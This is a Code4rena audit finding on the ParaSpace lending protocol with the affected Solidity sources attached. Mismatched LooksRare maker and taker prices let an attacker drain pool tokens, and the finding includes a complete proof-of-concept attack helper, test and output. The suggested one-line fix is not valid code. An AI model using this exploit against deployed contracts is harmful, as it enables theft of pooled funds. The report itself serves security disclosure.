{
  "Title": "[H-10] Attacker can drain pool using `executeBuyWithCredit` with malicious marketplace payload",
  "Content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L59><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L397>\n\nParaspace supports leveraged purchases of NFTs through PoolMarketplace entry points. User calls buyWithCredit with marketplace, calldata to be sent to marketplace, and how many tokens to borrow.\n\n    function buyWithCredit(\n        bytes32 marketplaceId,\n        bytes calldata payload,\n        DataTypes.Credit calldata credit,\n        uint16 referralCode\n    ) external payable virtual override nonReentrant {\n        DataTypes.PoolStorage storage ps = poolStorage();\n        MarketplaceLogic.executeBuyWithCredit(\n            marketplaceId,\n            payload,\n            credit,\n            ps,\n            ADDRESSES_PROVIDER,\n            referralCode\n        );\n    }\n\nIn executeBuyWithCredit, orders are deserialized from the payload user sent to a DataTypes.OrderInfo structure. Each MarketplaceAdapter is required to fulfil that functionality through getAskOrderInfo:\n\n    DataTypes.OrderInfo memory orderInfo = IMarketplace(marketplace.adapter)\n        .getAskOrderInfo(payload, vars.weth);\n\nIf we take a look at LooksRareAdapter's getAskOrderInfo, it will the consideration parameter using only the MakerOrder parameters, without taking into account TakerOrder params\n\n    (\n        OrderTypes.TakerOrder memory takerBid,\n        OrderTypes.MakerOrder memory makerAsk\n    ) = abi.decode(params, (OrderTypes.TakerOrder, OrderTypes.MakerOrder));\n    orderInfo.maker = makerAsk.signer;\n\n    consideration[0] = ConsiderationItem(\n        itemType,\n        token,\n        0,\n        makerAsk.price, // TODO: take minPercentageToAsk into account\n        makerAsk.price,\n        payable(takerBid.taker)\n    );\n\nThe OrderInfo constructed, which contains the consideration item from maker, is used in \\_delegateToPool, called by \\_buyWithCredit(), called by executeBuyWithCredit:\n\n    for (uint256 i = 0; i < params.orderInfo.consideration.length; i++) {\n        ConsiderationItem memory item = params.orderInfo.consideration[i];\n        require(\n            item.startAmount == item.endAmount,\n            Errors.INVALID_MARKETPLACE_ORDER\n        );\n        require(\n            item.itemType == ItemType.ERC20 ||\n                (vars.isETH && item.itemType == ItemType.NATIVE),\n            Errors.INVALID_ASSET_TYPE\n        );\n        require(\n            item.token == params.credit.token,\n            Errors.CREDIT_DOES_NOT_MATCH_ORDER\n        );\n        price += item.startAmount;\n    }\n\nThe total price is charged to msg.sender, and he will pay it with debt tokens + immediate downpayment.\nAfter enough funds are transfered to the Pool contract, it delegatecalls to the LooksRare adapter, which will do the actual call to LooksRareExchange. The exchange will send the money gathered in the pool to maker, and give it the NFT.\n\nThe issue is that attacker can supply a different price in the MakerOrder and TakerOrder passed as payload to LooksRare. The maker price will be reflected in the registered price charged to user, but taker price will be the one actually transferred from Pool.\n\nTo show taker price is what counts, this is the code in LooksRareExchange.sol:\n\n    function matchAskWithTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)\n        external\n        override\n        nonReentrant\n    {\n        require((makerAsk.isOrderAsk) && (!takerBid.isOrderAsk), \"Order: Wrong sides\");\n        require(msg.sender == takerBid.taker, \"Order: Taker must be the sender\");\n        // Check the maker ask order\n        bytes32 askHash = makerAsk.hash();\n        _validateOrder(makerAsk, askHash);\n        (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)\n            .canExecuteTakerBid(takerBid, makerAsk);\n        require(isExecutionValid, \"Strategy: Execution invalid\");\n        // Update maker ask order status to true (prevents replay)\n        _isUserOrderNonceExecutedOrCancelled[makerAsk.signer][makerAsk.nonce] = true;\n        // Execution part 1/2\n        _transferFeesAndFunds(\n            makerAsk.strategy,\n            makerAsk.collection,\n            tokenId,\n            makerAsk.currency,\n            msg.sender,\n            makerAsk.signer,\n            takerBid.price,   <--- taker price is what's charged\n            makerAsk.minPercentageToAsk\n        );\n    \t...\n    }\n\nSince attacker will be both maker and taker in this flow,  he has no problem in supplying a strategy which will accept higher taker price than maker price. It will pass this check:\n\n    (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)\n        .canExecuteTakerBid(takerBid, makerAsk);\n\nIt is important to note that for this exploit we can pass a 0 credit loan amount, which allows the stolen asset to be any asset, not just ones supported by the pool. This is because of early return in `_borrowTo()` and `\\repay()` functions.\n\nThe attack POC looks as follows:\n\n1.  Taker (attacker) has 10 DAI\n2.  Pool has 990 DAI\n3.  Maker (attacker) has 1 doodle NFT.\n4.  Taker submits buyWithCredit() transaction:\n\n*   credit amount 0\n*   TakerOrder with 1000 amount\n*   MakerOrder with 10 amount and \"accept all\" execution strategy\n\n5.  Pool will take the 10 DAI from taker and additional 990 DAI from it's own funds and send to Maker.\n6.  Attacker ends up with both 1000 DAI and an nToken of the NFT\n\n### Impact\n\nAny ERC20 tokens which exist in the pool contract can be drained by an attacker.\n\n### Proof of Concept\n\nIn `_pool_marketplace_buy_wtih_credit.spec.ts`, add this test:\n\n    it(\"looksrare attack\", async () => {\n      const {\n        doodles,\n        dai,\n        pool,\n        users: [maker, taker, middleman],\n      } = await loadFixture(testEnvFixture);\n      const payNowNumber = \"10\";\n      const poolVictimNumber = \"990\";\n      const payNowAmount = await convertToCurrencyDecimals(\n        dai.address,\n        payNowNumber\n      );\n      const poolVictimAmount = await convertToCurrencyDecimals(\n        dai.address,\n          poolVictimNumber\n      );\n      const totalAmount = payNowAmount.add(poolVictimAmount);\n      const nftId = 0;\n      // mint DAI to offer\n      // We don't need to give taker any money, he is not charged\n      // Instead, give the pool money\n      await mintAndValidate(dai, payNowNumber, taker);\n      await mintAndValidate(dai, poolVictimNumber, pool);\n      // middleman supplies DAI to pool to be borrowed by offer later\n      //await supplyAndValidate(dai, poolVictimNumber, middleman, true);\n      // maker mint mayc\n      await mintAndValidate(doodles, \"1\", maker);\n      // approve\n      await waitForTx(\n        await dai.connect(taker.signer).approve(pool.address, payNowAmount)\n      );\n      console.log(\"maker balance before\", await dai.balanceOf(maker.address))\n      console.log(\"taker balance before\", await dai.balanceOf(taker.address))\n      console.log(\"pool balance before\", await dai.balanceOf(pool.address))\n      await executeLooksrareBuyWithCreditAttack(\n        doodles,\n        dai,\n        payNowAmount,\n        totalAmount,\n        0,\n        nftId,\n        maker,\n        taker\n      );\n\nIn `marketplace-helper.ts`, please copy in the following attack code:\n\n    export async function executeLooksrareBuyWithCreditAttack(\n        tokenToBuy: MintableERC721 | NToken,\n        tokenToPayWith: MintableERC20,\n        makerAmount: BigNumber,\n        takerAmount: BigNumber,\n        creditAmount : BigNumberish,\n        nftId: number,\n        maker: SignerWithAddress,\n        taker: SignerWithAddress\n    ) {\n      const signer = DRE.ethers.provider.getSigner(maker.address);\n      const chainId = await maker.signer.getChainId();\n      const nonce = await maker.signer.getTransactionCount();\n\n      // approve\n      await waitForTx(\n          await tokenToBuy\n              .connect(maker.signer)\n              .approve((await getTransferManagerERC721()).address, nftId)\n      );\n\n      const now = Math.floor(Date.now() / 1000);\n      const paramsValue = [];\n      const makerOrder: MakerOrder = {\n        isOrderAsk: true,\n        signer: maker.address,\n        collection: tokenToBuy.address,\n        // Listed Maker price not includes payLater amount which is stolen\n        price: makerAmount,\n        tokenId: nftId,\n        amount: \"1\",\n        strategy: (await getStrategyStandardSaleForFixedPrice()).address,\n        currency: tokenToPayWith.address,\n        nonce: nonce,\n        startTime: now - 86400,\n        endTime: now + 86400, // 2 days validity\n        minPercentageToAsk: 7500,\n        params: paramsValue,\n      };\n\n      const looksRareExchange = await getLooksRareExchange();\n\n      const {domain, value, type} = generateMakerOrderTypedData(\n          maker.address,\n          chainId,\n          makerOrder,\n          looksRareExchange.address\n      );\n\n      const signatureHash = await signer._signTypedData(domain, type, value);\n\n      const makerOrderWithSignature: MakerOrderWithSignature = {\n        ...makerOrder,\n        signature: signatureHash,\n      };\n\n      const vrs = DRE.ethers.utils.splitSignature(\n          makerOrderWithSignature.signature\n      );\n\n      const makerOrderWithVRS: MakerOrderWithVRS = {\n        ...makerOrderWithSignature,\n        ...vrs,\n      };\n      const pool = await getPoolProxy();\n      const takerOrder: TakerOrder = {\n        isOrderAsk: false,\n        taker: pool.address,\n        price: takerAmount,\n        tokenId: makerOrderWithSignature.tokenId,\n        minPercentageToAsk: 7500,\n        params: paramsValue,\n      };\n\n      const encodedData = looksRareExchange.interface.encodeFunctionData(\n          \"matchAskWithTakerBid\",\n          [takerOrder, makerOrderWithVRS]\n      );\n\n      const tx = pool.connect(taker.signer).buyWithCredit(\n          LOOKSRARE_ID,\n          `0x${encodedData.slice(10)}`,\n          {\n            token: tokenToPayWith.address,\n            amount: creditAmount,\n            orderId: constants.HashZero,\n            v: 0,\n            r: constants.HashZero,\n            s: constants.HashZero,\n          },\n          0,\n          {\n            gasLimit: 5000000,\n          }\n      );\n\n      await (await tx).wait();\n    }\n\nFinally, we need to change the passed execution strategy. In `StrategyStandardSaleForFixedPrice.sol`, change `canExecuteTakerBid`:\n\n    function canExecuteTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)\n        external\n        view\n        override\n        returns (\n            bool,\n            uint256,\n            uint256\n        )\n    {\n        return (\n            //((makerAsk.price == takerBid.price) &&\n            //    (makerAsk.tokenId == takerBid.tokenId) &&\n            //    (makerAsk.startTime <= block.timestamp) &&\n            //    (makerAsk.endTime >= block.timestamp)),\n            true,\n            makerAsk.tokenId,\n            makerAsk.amount\n        );\n    }\n\nWe can see the output:\n\n```\nmaker balance before BigNumber { value: \"0\" }\ntaker balance before BigNumber { value: \"10000000000000000000\" }\npool balance before BigNumber { value: \"990000000000000000000\" }\nmaker balance after BigNumber { value: \"1000000000000000000000\" }\ntaker balance after BigNumber { value: \"0\" }\npool balance after BigNumber { value: \"0\" }\n\n  Leveraged Buy - Positive tests\n    âœ” looksrare attack (34857ms)\n\n\n  1 passing (54s)\n\n```\n\n### Recommended Mitigation Steps\n\nIt is important to validate that the price charged to user is the same price taken from the Pool contract:\n\n    // In LooksRareAdapter's getAskOrderInfo:\n    require(makerAsk.price, takerBid.price)\n\n\n\n***\n\n \n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2022-11-paraspace",
  "Code": [
    {
      "filename": "paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.10;\n\nimport {DataTypes} from \"../../protocol/libraries/types/DataTypes.sol\";\nimport {Errors} from \"../../protocol/libraries/helpers/Errors.sol\";\nimport {OrderTypes} from \"../../dependencies/looksrare/contracts/libraries/OrderTypes.sol\";\nimport {SeaportInterface} from \"../../dependencies/seaport/contracts/interfaces/SeaportInterface.sol\";\nimport {ILooksRareExchange} from \"../../dependencies/looksrare/contracts/interfaces/ILooksRareExchange.sol\";\nimport {SignatureChecker} from \"../../dependencies/looksrare/contracts/libraries/SignatureChecker.sol\";\nimport {ConsiderationItem} from \"../../dependencies/seaport/contracts/lib/ConsiderationStructs.sol\";\nimport {AdvancedOrder, CriteriaResolver, Fulfillment, OfferItem, ItemType} from \"../../dependencies/seaport/contracts/lib/ConsiderationStructs.sol\";\nimport {Address} from \"../../dependencies/openzeppelin/contracts/Address.sol\";\nimport {IERC1271} from \"../../dependencies/openzeppelin/contracts/IERC1271.sol\";\nimport {IMarketplace} from \"../../interfaces/IMarketplace.sol\";\nimport {PoolStorage} from \"../../protocol/pool/PoolStorage.sol\";\n\n/**\n * @title LooksRare Adapter\n *\n * @notice Implements the NFT <=> ERC20 exchange logic via LooksRare marketplace\n */\ncontract LooksRareAdapter is IMarketplace {\n    constructor() {}\n\n    function getAskOrderInfo(bytes memory params, address weth)\n        external\n        pure\n        override\n        returns (DataTypes.OrderInfo memory orderInfo)\n    {\n        (\n            OrderTypes.TakerOrder memory takerBid,\n            OrderTypes.MakerOrder memory makerAsk\n        ) = abi.decode(params, (OrderTypes.TakerOrder, OrderTypes.MakerOrder));\n        orderInfo.maker = makerAsk.signer;\n\n        OfferItem[] memory offer = new OfferItem[](1);\n        offer[0] = OfferItem(\n            ItemType.ERC721,\n            makerAsk.collection,\n            makerAsk.tokenId,\n            1,\n            1\n        );\n        orderInfo.offer = offer;\n\n        ConsiderationItem[] memory consideration = new ConsiderationItem[](1);\n\n        ItemType itemType = ItemType.ERC20;\n        address token = makerAsk.currency;\n        if (token == weth) {\n            itemType = ItemType.NATIVE;\n            token = address(0);\n        }\n        consideration[0] = ConsiderationItem(\n            itemType,\n            token,\n            0,\n            makerAsk.price, // TODO: take minPercentageToAsk into account\n            makerAsk.price,\n            payable(takerBid.taker)\n        );\n        orderInfo.id = abi.encodePacked(makerAsk.r, makerAsk.s, makerAsk.v);\n        orderInfo.consideration = consideration;\n    }\n\n    function getBidOrderInfo(\n        bytes memory /*params*/\n    ) external pure override returns (DataTypes.OrderInfo memory) {\n        revert(Errors.CALL_MARKETPLACE_FAILED);\n    }\n\n    function matchAskWithTakerBid(\n        address marketplace,\n        bytes calldata params,\n        uint256 value\n    ) external payable override returns (bytes memory) {\n        bytes4 selector;\n        if (value == 0) {\n            selector = ILooksRareExchange.matchAskWithTakerBid.selector;\n        } else {\n            selector = ILooksRareExchange\n                .matchAskWithTakerBidUsingETHAndWETH\n                .selector;\n        }\n        bytes memory data = abi.encodePacked(selector, params);\n        return\n            Address.functionCallWithValue(\n                marketplace,\n                data,\n                value,\n                Errors.CALL_MARKETPLACE_FAILED\n            );\n    }\n\n    function matchBidWithTakerAsk(address, bytes calldata)\n        external\n        pure\n        override\n        returns (bytes memory)\n    {\n        revert(Errors.CALL_MARKETPLACE_FAILED);\n    }\n}"
    },
    {
      "filename": "paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.10;\n\nimport {IERC721} from \"../../../dependencies/openzeppelin/contracts/IERC721.sol\";\nimport {INToken} from \"../../../interfaces/INToken.sol\";\nimport {IPoolAddressesProvider} from \"../../../interfaces/IPoolAddressesProvider.sol\";\nimport {XTokenType} from \"../../../interfaces/IXTokenType.sol\";\nimport {ICollateralizableERC721} from \"../../../interfaces/ICollateralizableERC721.sol\";\nimport {DataTypes} from \"../types/DataTypes.sol\";\nimport {IPToken} from \"../../../interfaces/IPToken.sol\";\nimport {Errors} from \"../helpers/Errors.sol\";\nimport {ValidationLogic} from \"./ValidationLogic.sol\";\nimport {SupplyLogic} from \"./SupplyLogic.sol\";\nimport {BorrowLogic} from \"./BorrowLogic.sol\";\nimport {SeaportInterface} from \"../../../dependencies/seaport/contracts/interfaces/SeaportInterface.sol\";\nimport {SafeERC20} from \"../../../dependencies/openzeppelin/contracts/SafeERC20.sol\";\nimport {IERC20} from \"../../../dependencies/openzeppelin/contracts/IERC20.sol\";\nimport {IERC721} from \"../../../dependencies/openzeppelin/contracts/IERC721.sol\";\nimport {ConsiderationItem, OfferItem} from \"../../../dependencies/seaport/contracts/lib/ConsiderationStructs.sol\";\nimport {ItemType} from \"../../../dependencies/seaport/contracts/lib/ConsiderationEnums.sol\";\nimport {AdvancedOrder, CriteriaResolver, Fulfillment} from \"../../../dependencies/seaport/contracts/lib/ConsiderationStructs.sol\";\nimport {IWETH} from \"../../../misc/interfaces/IWETH.sol\";\nimport {UserConfiguration} from \"../configuration/UserConfiguration.sol\";\nimport {ReserveConfiguration} from \"../configuration/ReserveConfiguration.sol\";\nimport {IMarketplace} from \"../../../interfaces/IMarketplace.sol\";\nimport {Address} from \"../../../dependencies/openzeppelin/contracts/Address.sol\";\n\n/**\n * @title Marketplace library\n *\n * @notice Implements the base logic for all the actions related to NFT buy/accept bid\n */\nlibrary MarketplaceLogic {\n    using UserConfiguration for DataTypes.UserConfigurationMap;\n    using ReserveConfiguration for DataTypes.ReserveConfigurationMap;\n    using SafeERC20 for IERC20;\n\n    event BuyWithCredit(\n        bytes32 indexed marketplaceId,\n        DataTypes.OrderInfo orderInfo,\n        DataTypes.Credit credit\n    );\n\n    event AcceptBidWithCredit(\n        bytes32 indexed marketplaceId,\n        DataTypes.OrderInfo orderInfo,\n        DataTypes.Credit credit\n    );\n\n    struct MarketplaceLocalVars {\n        bool isETH;\n        address xTokenAddress;\n        address creditToken;\n        uint256 creditAmount;\n        address weth;\n        uint256 ethLeft;\n        bytes32 marketplaceId;\n        bytes payload;\n        DataTypes.Marketplace marketplace;\n        DataTypes.OrderInfo orderInfo;\n    }\n\n    function executeBuyWithCredit(\n        bytes32 marketplaceId,\n        bytes calldata payload,\n        DataTypes.Credit calldata credit,\n        DataTypes.PoolStorage storage ps,\n        IPoolAddressesProvider poolAddressProvider,\n        uint16 referralCode\n    ) external {\n        MarketplaceLocalVars memory vars;\n\n        vars.weth = poolAddressProvider.getWETH();\n        DataTypes.Marketplace memory marketplace = poolAddressProvider\n            .getMarketplace(marketplaceId);\n        DataTypes.OrderInfo memory orderInfo = IMarketplace(marketplace.adapter)\n            .getAskOrderInfo(payload, vars.weth);\n        orderInfo.taker = msg.sender;\n        vars.ethLeft = msg.value;\n\n        _depositETH(vars, orderInfo);\n\n        vars.ethLeft -= _buyWithCredit(\n            ps._reserves,\n            ps._reservesList,\n            ps._usersConfig[orderInfo.taker],\n            DataTypes.ExecuteMarketplaceParams({\n                marketplaceId: marketplaceId,\n                payload: payload,\n                credit: credit,\n                ethLeft: vars.ethLeft,\n                marketplace: marketplace,\n                orderInfo: orderInfo,\n                weth: vars.weth,\n                referralCode: referralCode,\n                reservesCount: ps._reservesCount,\n                oracle: poolAddressProvider.getPriceOracle(),\n                priceOracleSentinel: poolAddressProvider.getPriceOracleSentinel()\n            })\n        );\n\n        _refundETH(vars.ethLeft);\n    }\n\n    /**\n     * @notice Implements the buyWithCredit feature. BuyWithCredit allows users to buy NFT from various NFT marketplaces\n     * including OpenSea, LooksRare, X2Y2 etc. Users can use NFT's credit and will need to pay at most (1 - LTV) * $NFT\n     * @dev  Emits the `BuyWithCredit()` event\n     * @param reservesData The state of all the reserves\n     * @param reservesList The addresses of all the active reserves\n     * @param userConfig The user configuration mapping that tracks the supplied/borrowed assets\n     * @param params The additional parameters needed to execute the buyWithCredit function\n     */\n    function _buyWithCredit(\n        mapping(address => DataTypes.ReserveData) storage reservesData,\n        mapping(uint256 => address) storage reservesList,\n        DataTypes.UserConfigurationMap storage userConfig,\n        DataTypes.ExecuteMarketplaceParams memory params\n    ) internal returns (uint256) {\n        ValidationLogic.validateBuyWithCredit(params);\n\n        MarketplaceLocalVars memory vars = _cache(params);\n\n        _borrowTo(reservesData, params, vars, address(this));\n\n        (uint256 priceEth, uint256 downpaymentEth) = _delegateToPool(\n            params,\n            vars\n        );\n\n        // delegateCall to avoid extra token transfer\n        Address.functionDelegateCall(\n            params.marketplace.adapter,\n            abi.encodeWithSelector(\n                IMarketplace.matchAskWithTakerBid.selector,\n                params.marketplace.marketplace,\n                params.payload,\n                priceEth\n            )\n        );\n\n        _repay(\n            reservesData,\n            reservesList,\n            userConfig,\n            params,\n            vars,\n            params.orderInfo.taker\n        );\n\n        emit BuyWithCredit(\n            params.marketplaceId,\n            params.orderInfo,\n            params.credit\n        );\n\n        return downpaymentEth;\n    }\n\n    function executeBatchBuyWithCredit(\n        bytes32[] calldata marketplaceIds,\n        bytes[] calldata payloads,\n        DataTypes.Credit[] calldata credits,\n        DataTypes.PoolStorage storage ps,\n        IPoolAddressesProvider poolAddressProvider,\n        uint16 referralCode\n    ) external {\n        MarketplaceLocalVars memory vars;\n\n        vars.weth = poolAddressProvider.getWETH();\n        require(\n            marketplaceIds.length == payloads.length &&\n                payloads.length == credits.length,\n            Errors.INCONSISTENT_PARAMS_LENGTH\n        );\n        vars.ethLeft = msg.value;\n        for (uint256 i = 0; i < marketplaceIds.length; i++) {\n            vars.marketplaceId = marketplaceIds[i];\n            vars.payload = payloads[i];\n            DataTypes.Credit memory credit = credits[i];\n\n            DataTypes.Marketplace memory marketplace = poolAddressProvider\n                .getMarketplace(vars.marketplaceId);\n            DataTypes.OrderInfo memory orderInfo = IMarketplace(\n                marketplace.adapter\n            ).getAskOrderInfo(vars.payload, vars.weth);\n            orderInfo.taker = msg.sender;\n\n            // Once we encounter a listing using WETH, then we convert all our ethLeft to WETH\n            // this also means that the parameters order is very important\n            //\n            // frontend/sdk needs to guarantee that WETH orders will always be put after ALL\n            // ETH orders, all ETH orders after WETH orders will fail\n            //\n            // eg. The following example image that the `taker` owns only ETH and wants to\n            // batch buy bunch of NFTs which are listed using WETH and ETH\n            //\n            // batchBuyWithCredit([ETH, WETH, ETH]) => ko\n            //                            | -> convert all ethLeft to WETH, 3rd purchase will fail\n            // batchBuyWithCredit([ETH, ETH, ETH]) => ok\n            // batchBuyWithCredit([ETH, ETH, WETH]) => ok\n            //\n            _depositETH(vars, orderInfo);\n\n            vars.ethLeft -= _buyWithCredit(\n                ps._reserves,\n                ps._reservesList,\n                ps._usersConfig[orderInfo.taker],\n                DataTypes.ExecuteMarketplaceParams({\n                    marketplaceId: vars.marketplaceId,\n                    payload: vars.payload,\n                    credit: credit,\n                    ethLeft: vars.ethLeft,\n                    marketplace: marketplace,\n                    orderInfo: orderInfo,\n                    weth: vars.weth,\n                    referralCode: referralCode,\n                    reservesCount: ps._reservesCount,\n                    oracle: poolAddressProvider.getPriceOracle(),\n                    priceOracleSentinel: poolAddressProvider\n                        .getPriceOracleSentinel()\n                })\n            );\n        }\n\n        _refundETH(vars.ethLeft);\n    }\n\n    function executeAcceptBidWithCredit(\n        bytes32 marketplaceId,\n        bytes calldata payload,\n        DataTypes.Credit calldata credit,\n        address onBehalfOf,\n        DataTypes.PoolStorage storage ps,\n        IPoolAddressesProvider poolAddressProvider,\n        uint16 referralCode\n    ) external {\n        MarketplaceLocalVars memory vars;\n\n        vars.weth = poolAddressProvider.getWETH();\n        vars.marketplace = poolAddressProvider.getMarketplace(marketplaceId);\n        vars.orderInfo = IMarketplace(vars.marketplace.adapter).getBidOrderInfo(\n            payload\n        );\n        require(vars.orderInfo.taker == onBehalfOf, Errors.INVALID_ORDER_TAKER);\n\n        _acceptBidWithCredit(\n            ps._reserves,\n            ps._reservesList,\n            ps._usersConfig[vars.orderInfo.maker],\n            DataTypes.ExecuteMarketplaceParams({\n                marketplaceId: marketplaceId,\n                payload: payload,\n                credit: credit,\n                ethLeft: 0,\n                marketplace: vars.marketplace,\n                orderInfo: vars.orderInfo,\n                weth: vars.weth,\n                referralCode: referralCode,\n                reservesCount: ps._reservesCount,\n                oracle: poolAddressProvider.getPriceOracle(),\n                priceOracleSentinel: poolAddressProvider.getPriceOracleSentinel()\n            })\n        );\n    }\n\n    function executeBatchAcceptBidWithCredit(\n        bytes32[] calldata marketplaceIds,\n        bytes[] calldata payloads,\n        DataTypes.Credit[] calldata credits,\n        address onBehalfOf,\n        DataTypes.PoolStorage storage ps,\n        IPoolAddressesProvider poolAddressProvider,\n        uint16 referralCode\n    ) external {\n        MarketplaceLocalVars memory vars;\n\n        vars.weth = poolAddressProvider.getWETH();\n        require(\n            marketplaceIds.length == payloads.length &&\n                payloads.length == credits.length,\n            Errors.INCONSISTENT_PARAMS_LENGTH\n        );\n        for (uint256 i = 0; i < marketplaceIds.length; i++) {\n            vars.marketplaceId = marketplaceIds[i];\n            vars.payload = payloads[i];\n            DataTypes.Credit memory credit = credits[i];\n\n            vars.marketplace = poolAddressProvider.getMarketplace(\n                vars.marketplaceId\n            );\n            vars.orderInfo = IMarketplace(vars.marketplace.adapter)\n                .getBidOrderInfo(vars.payload);\n            require(\n                vars.orderInfo.taker == onBehalfOf,\n                Errors.INVALID_ORDER_TAKER\n            );\n\n            _acceptBidWithCredit(\n                ps._reserves,\n                ps._reservesList,\n                ps._usersConfig[vars.orderInfo.maker],\n                DataTypes.ExecuteMarketplaceParams({\n                    marketplaceId: vars.marketplaceId,\n                    payload: vars.payload,\n                    credit: credit,\n                    ethLeft: 0,\n                    marketplace: vars.marketplace,\n                    orderInfo: vars.orderInfo,\n                    weth: vars.weth,\n                    referralCode: referralCode,\n                    reservesCount: ps._reservesCount,\n                    oracle: poolAddressProvider.getPriceOracle(),\n                    priceOracleSentinel: poolAddressProvider\n                        .getPriceOracleSentinel()\n                })\n            );\n        }\n    }\n\n    /**\n     * @notice Implements the acceptBidWithCredit feature. AcceptBidWithCredit allows users to\n     * accept a leveraged bid on ParaSpace NFT marketplace. Users can submit leveraged bid and pay\n     * at most (1 - LTV) * $NFT\n     * @dev  Emits the `AcceptBidWithCredit()` event\n     * @param reservesData The state of all the reserves\n     * @param reservesList The addresses of all the active reserves\n     * @param userConfig The user configuration mapping that tracks the supplied/borrowed assets\n     * @param params The additional parameters needed to execute the acceptBidWithCredit function\n     */\n    function _acceptBidWithCredit(\n        mapping(address => DataTypes.ReserveData) storage reservesData,\n        mapping(uint256 => address) storage reservesList,\n        DataTypes.UserConfigurationMap storage userConfig,\n        DataTypes.ExecuteMarketplaceParams memory params\n    ) internal {\n        ValidationLogic.validateAcceptBidWithCredit(params);\n\n        MarketplaceLocalVars memory vars = _cache(params);\n\n        _borrowTo(reservesData, params, vars, params.orderInfo.maker);\n\n        // delegateCall to avoid extra token transfer\n        Address.functionDelegateCall(\n            params.marketplace.adapter,\n            abi.encodeWithSelector(\n                IMarketplace.matchBidWithTakerAsk.selector,\n                params.marketplace.marketplace,\n                params.payload\n            )\n        );\n\n        _repay(\n            reservesData,\n            reservesList,\n            userConfig,\n            params,\n            vars,\n            params.orderInfo.maker\n        );\n\n        emit AcceptBidWithCredit(\n            params.marketplaceId,\n            params.orderInfo,\n            params.credit\n        );\n    }\n\n    /**\n     * @notice Transfer payNow portion from taker to this contract. This is only useful\n     * in buyWithCredit.\n     * @dev\n     * @param params The additional parameters needed to execute the buyWithCredit/acceptBidWithCredit function\n     * @param vars The marketplace local vars for caching storage values for future reads\n     */\n    function _delegateToPool(\n        DataTypes.ExecuteMarketplaceParams memory params,\n        MarketplaceLocalVars memory vars\n    ) internal returns (uint256, uint256) {\n        uint256 price = 0;\n\n        for (uint256 i = 0; i < params.orderInfo.consideration.length; i++) {\n            ConsiderationItem memory item = params.orderInfo.consideration[i];\n            require(\n                item.startAmount == item.endAmount,\n                Errors.INVALID_MARKETPLACE_ORDER\n            );\n            require(\n                item.itemType == ItemType.ERC20 ||\n                    (vars.isETH && item.itemType == ItemType.NATIVE),\n                Errors.INVALID_ASSET_TYPE\n            );\n            require(\n                item.token == params.credit.token,\n                Errors.CREDIT_DOES_NOT_MATCH_ORDER\n            );\n            price += item.startAmount;\n        }\n\n        uint256 downpayment = price - vars.creditAmount;\n        if (!vars.isETH) {\n            IERC20(vars.creditToken).safeTransferFrom(\n                params.orderInfo.taker,\n                address(this),\n                downpayment\n            );\n            _checkAllowance(vars.creditToken, params.marketplace.operator);\n            // convert to (priceEth, downpaymentEth)\n            price = 0;\n            downpayment = 0;\n        } else {\n            require(params.ethLeft >= downpayment, Errors.PAYNOW_NOT_ENOUGH);\n        }\n\n        return (price, downpayment);\n    }\n\n    /**\n     * @notice Borrow credit.amount from `credit.token` reserve without collateral. The corresponding\n     * debt will be minted in the same block to the borrower.\n     * @dev\n     * @param reservesData The state of all the reserves\n     * @param params The additional parameters needed to execute the buyWithCredit/acceptBidWithCredit function\n     * @param vars The marketplace local vars for caching storage values for future reads\n     * @param to The receiver of borrowed tokens\n     */\n    function _borrowTo(\n        mapping(address => DataTypes.ReserveData) storage reservesData,\n        DataTypes.ExecuteMarketplaceParams memory params,\n        MarketplaceLocalVars memory vars,\n        address to\n    ) internal {\n        if (vars.creditAmount == 0) {\n            return;\n        }\n\n        DataTypes.ReserveData storage reserve = reservesData[vars.creditToken];\n        vars.xTokenAddress = reserve.xTokenAddress;\n\n        require(vars.xTokenAddress != address(0), Errors.ASSET_NOT_LISTED);\n        ValidationLogic.validateFlashloanSimple(reserve);\n        // TODO: support PToken\n        IPToken(vars.xTokenAddress).transferUnderlyingTo(to, vars.creditAmount);\n\n        if (vars.isETH) {\n            // No re-entrancy because it sent to our contract address\n            IWETH(params.weth).withdraw(vars.creditAmount);\n        }\n    }\n\n    /**\n     * @notice Repay credit.amount by minting debt to the borrower. Borrower's received NFT\n     * will also need to be supplied to the pool to provide bigger borrow limit.\n     * @dev\n     * @param reservesData The state of all the reserves\n     * @param reservesList The addresses of all the active reserves\n     * @param userConfig The user configuration mapping that tracks the supplied/borrowed assets\n     * @param params The additional parameters needed to execute the buyWithCredit/acceptBidWithCredit function\n     * @param vars The marketplace local vars for caching storage values for future reads\n     * @param onBehalfOf The receiver of minted debt and NToken\n     */\n    function _repay(\n        mapping(address => DataTypes.ReserveData) storage reservesData,\n        mapping(uint256 => address) storage reservesList,\n        DataTypes.UserConfigurationMap storage userConfig,\n        DataTypes.ExecuteMarketplaceParams memory params,\n        MarketplaceLocalVars memory vars,\n        address onBehalfOf\n    ) internal {\n        for (uint256 i = 0; i < params.orderInfo.offer.length; i++) {\n            OfferItem memory item = params.orderInfo.offer[i];\n            require(\n                item.itemType == ItemType.ERC721,\n                Errors.INVALID_ASSET_TYPE\n            );\n\n            // underlyingAsset\n            address token = item.token;\n            uint256 tokenId = item.identifierOrCriteria;\n            // NToken\n            vars.xTokenAddress = reservesData[token].xTokenAddress;\n\n            // item.token == NToken\n            if (vars.xTokenAddress == address(0)) {\n                address underlyingAsset = INToken(token)\n                    .UNDERLYING_ASSET_ADDRESS();\n                bool isNToken = reservesData[underlyingAsset].xTokenAddress ==\n                    token;\n                require(isNToken, Errors.ASSET_NOT_LISTED);\n                vars.xTokenAddress = token;\n                token = underlyingAsset;\n            }\n\n            